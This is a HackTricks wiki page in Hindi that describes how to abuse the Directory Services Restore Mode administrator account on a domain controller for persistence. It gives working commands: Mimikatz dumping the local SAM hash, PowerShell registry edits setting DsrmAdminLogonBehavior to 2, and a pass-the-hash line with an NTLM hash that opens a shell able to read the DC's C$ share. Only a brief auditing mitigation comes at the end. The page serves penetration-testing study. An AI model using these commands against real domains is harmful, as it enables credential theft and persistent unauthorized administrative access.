{{#include ../../banners/hacktricks-training.md}}

# DSRM Credentials

हर **DC** के अंदर एक **स्थानीय व्यवस्थापक** खाता होता है। इस मशीन में व्यवस्थापक विशेषाधिकार होने पर आप mimikatz का उपयोग करके **स्थानीय व्यवस्थापक हैश** को **डंप** कर सकते हैं। फिर, एक रजिस्ट्री को संशोधित करके इस पासवर्ड को **सक्रिय** करें ताकि आप इस स्थानीय व्यवस्थापक उपयोगकर्ता तक दूरस्थ रूप से पहुंच सकें।\
पहले हमें DC के अंदर **स्थानीय व्यवस्थापक** उपयोगकर्ता का **हैश** **डंप** करने की आवश्यकता है:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
फिर हमें यह जांचने की आवश्यकता है कि क्या वह खाता काम करेगा, और यदि रजिस्ट्री कुंजी का मान "0" है या यह मौजूद नहीं है, तो आपको **इसे "2" पर सेट करना होगा**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
फिर, PTH का उपयोग करके आप **C$ की सामग्री सूचीबद्ध कर सकते हैं या यहां तक कि एक शेल प्राप्त कर सकते हैं**। ध्यान दें कि उस हैश के साथ एक नई पावरशेल सत्र बनाने के लिए (PTH के लिए) **"डोमेन" जो उपयोग किया जाता है वह केवल DC मशीन का नाम है:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
अधिक जानकारी के लिए: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) और [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## शमन

- इवेंट आईडी 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` के ऑडिट निर्माण/परिवर्तन
